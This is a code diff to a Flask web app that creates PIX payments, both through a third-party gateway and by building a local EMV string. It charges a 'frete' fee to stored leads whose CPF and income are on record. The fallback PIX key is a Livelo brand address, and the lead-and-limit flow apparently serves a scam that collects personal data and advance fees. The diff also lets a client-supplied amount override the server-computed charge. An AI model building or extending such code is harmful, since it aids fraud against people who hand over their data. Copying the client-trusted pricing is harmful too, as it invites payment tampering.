@@ -633,24 +633,72 @@ def api_whatsapp():
 def c7_create_pix(amount: float, payer_name: str, payer_cpf: str, payment_id: str) -> dict:
     try:
         db = get_db()
+        row_key = db.execute("SELECT value FROM sys_config WHERE key='c7_api_key'").fetchone()
+        api_key = row_key["value"] if row_key and row_key["value"] else os.environ.get("C7_API_KEY", "")
+        row_sec = db.execute("SELECT value FROM sys_config WHERE key='c7_api_secret'").fetchone()
+        api_secret = row_sec["value"] if row_sec and row_sec["value"] else os.environ.get("C7_API_SECRET", "")
+        
+        if api_key and api_secret and _REQUESTS_OK:
+            ts = str(int(time.time()))
+            nonce = str(uuid.uuid4())
+            # Convert amount to float and round to 2 decimals, but python might dump it as 150.0. Let's just use float.
+            payload = {
+                "amount": float(amount),
+                "externalId": payment_id
+            }
+            body_str = json.dumps(payload, separators=(',', ':'))
+            msg = f"{ts}.{nonce}.{body_str}"
+            sig = hmac.new(api_secret.encode('utf-8'), msg.encode('utf-8'), hashlib.sha256).hexdigest()
+            headers = {
+                "Authorization": f"Bearer {api_key}",
+                "Content-Type": "application/json",
+                "X-C7-Timestamp": ts,
+                "X-C7-Nonce": nonce,
+                "X-C7-Signature": sig
+            }
+            try:
+                resp = _req.post("https://api.carteirado7.com/v2/payment/create", data=body_str, headers=headers, timeout=10)
+                if resp.status_code == 200:
+                    data = resp.json()
+                    if data.get("ok"):
+                        return {
+                            "ok": True,
+                            "pix_code": data["payment"]["pixCopiaECola"],
+                            "qr_code_url": data["payment"]["qrCodeBase64"]
+                        }
+                else:
+                    app.logger.error(f"C7 API ERROR [{resp.status_code}]: {resp.text}")
+                    # If we have keys and it fails, let's print it to console so Vercel logs it
+                    print(f"C7 API ERROR [{resp.status_code}]: {resp.text}")
+            except Exception as e:
+                app.logger.error(f"C7 EXCEPTION: {str(e)}")
+                print(f"C7 EXCEPTION: {str(e)}")
+        
+        # Fallback local EMV PIX generation
         row = db.execute("SELECT value FROM sys_config WHERE key='pix_key'").fetchone()
         chave_pix = row["value"] if row and row["value"] else "suporte@livelo.com.br"
         
-        payload_format = (
-            "00020126580014br.gov.bcb.pix0136{chave_pix}"
-            "52040000530398654{amount_len}{amount_str}"
-            "5802BR5913{name}6008SAOPAULO62290525{txid}6304"
-        )
         amount_str = f"{amount:.2f}"
         name = (payer_name[:13] or "Cliente").ljust(13, ' ').upper()
-        txid = (payment_id[:25]).ljust(25, 'x')
+        # txid for PIX cannot have hyphens
+        txid = payment_id.replace('-', '')[:25].ljust(25, 'x')
         
-        pix_str = payload_format.format(
-            chave_pix=chave_pix,
-            amount_len=f"{len(amount_str):02d}",
-            amount_str=amount_str,
-            name=name,
-            txid=txid
+        gui = "0014br.gov.bcb.pix"
+        key_str = f"01{len(chave_pix):02d}{chave_pix}"
+        f26_content = gui + key_str
+        f26 = f"26{len(f26_content):02d}{f26_content}"
+        
+        pix_str = (
+            "000201" +
+            f26 +
+            "52040000" +
+            "5303986" +
+            f"54{len(amount_str):02d}{amount_str}" +
+            "5802BR" +
+            f"5913{name}" +
+            "6008SAOPAULO" +
+            f"62290525{txid}" +
+            "6304"
         )
         
         # Calculate CRC16
@@ -684,6 +732,7 @@ def api_gerar_pix():
     """
     data = get_secure_json()
     sid = sanitize(data.get("session_id") or data.get("sessionId", ""), 40)
+    user_amount = data.get("amount")
 
     db   = get_db()
     lead = db.execute("SELECT * FROM leads WHERE session_id=?", (sid,)).fetchone()
@@ -703,7 +752,15 @@ def api_gerar_pix():
     # Determina valor do frete
     renda   = lead["renda"] or "0"
     analise = calc_limite(renda)
-    frete   = analise["frete"]
+    
+    if user_amount is not None:
+        try:
+            frete = float(user_amount)
+        except:
+            frete = analise["frete"]
+    else:
+        frete = analise["frete"]
+        
     nome    = lead["nome"] or "Cliente"
     cpf     = lead["cpf"] or ""
 
